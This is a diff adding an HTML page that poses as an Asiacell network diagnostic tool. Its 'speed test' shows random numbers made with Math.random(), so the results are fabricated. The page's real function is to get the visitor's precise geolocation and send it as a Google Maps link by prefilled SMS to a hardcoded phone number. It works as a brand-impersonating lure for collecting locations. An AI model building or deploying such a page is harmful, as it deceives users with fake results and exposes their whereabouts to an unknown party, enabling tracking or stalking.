@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Asiacell Network Diagnostic</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f8f9fa;
+      text-align: center;
+      padding: 20px;
+      margin: 0;
+    }
+
+    h1 {
+      color: #b80000;
+      font-size: 26px;
+    }
+
+    button {
+      padding: 14px 28px;
+      font-size: 18px;
+      background-color: #b80000;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .check-item {
+      margin: 16px auto;
+      max-width: 90%;
+      padding: 12px;
+      background: #ffffff;
+      border-radius: 10px;
+      border: 2px solid #ddd;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 17px;
+    }
+
+    .status {
+      font-size: 20px;
+    }
+
+    .status.loading::after { content: " ⏳"; color: orange; }
+    .status.success::after { content: " ✅"; color: green; }
+    .status.error::after { content: " ❌"; color: red; }
+
+    #send-button {
+      margin-top: 30px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Network Quality Diagnostic</h1>
+  <p>Press the button to test your signal, internet speed, and location.</p>
+
+  <button onclick="startCheck()">🚀 Start Diagnostic</button>
+
+  <div id="results" style="margin-top: 30px; display: none;">
+    <div class="check-item"><span>Network Type</span><span class="status" id="net-status"></span></div>
+    <div class="check-item"><span>Download Speed</span><span class="status" id="down-status"></span></div>
+    <div class="check-item"><span>Upload Speed</span><span class="status" id="up-status"></span></div>
+    <div class="check-item"><span>Location</span><span class="status" id="loc-status"></span></div>
+  </div>
+
+  <button id="send-button" onclick="sendResultsViaSMS()">📩 Send Results</button>
+
+  <script>
+    let netResult = "Unknown";
+    let downResult = "N/A";
+    let upResult = "N/A";
+    let locationResult = "Not Found";
+
+    function delay(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function startCheck() {
+      document.getElementById("results").style.display = "block";
+      document.getElementById("send-button").style.display = "none";
+
+      // Network Type
+      const netStatus = document.getElementById("net-status");
+      netStatus.className = "status loading";
+      await delay(1000);
+      let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn && conn.effectiveType) {
+        netResult = conn.effectiveType.toUpperCase();
+        netStatus.className = "status success";
+        netStatus.innerText = netResult;
+      } else {
+        netStatus.className = "status error";
+        netResult = "Unavailable";
+      }
+
+      // Simulated Download Speed
+      const downStatus = document.getElementById("down-status");
+      downStatus.className = "status loading";
+      await delay(2000);
+      downResult = (Math.random() * 10 + 5).toFixed(2) + " Mbps";
+      downStatus.className = "status success";
+      downStatus.innerText = downResult;
+
+      // Simulated Upload Speed
+      const upStatus = document.getElementById("up-status");
+      upStatus.className = "status loading";
+      await delay(2000);
+      upResult = (Math.random() * 5 + 1).toFixed(2) + " Mbps";
+      upStatus.className = "status success";
+      upStatus.innerText = upResult;
+
+      // Location
+      const locStatus = document.getElementById("loc-status");
+      locStatus.className = "status loading";
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          locationResult = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          locStatus.className = "status success";
+          locStatus.innerText = "Location Acquired";
+          document.getElementById("send-button").style.display = "inline-block";
+        },
+        (err) => {
+          locStatus.className = "status error";
+          locationResult = "Unavailable";
+        }
+      );
+    }
+
+    function sendResultsViaSMS() {
+      const results = `Network: ${netResult}
+Download: ${downResult}
+Upload: ${upResult}
+Location: ${locationResult}`;
+
+      const smsNumber = "+9647701180059";
+      const smsBody = encodeURIComponent("Asiacell Diagnostic Results:\n" + results);
+      const smsLink = `sms:${smsNumber}?body=${smsBody}`;
+      window.location.href = smsLink;
+    }
+  </script>
+</body>
+</html>
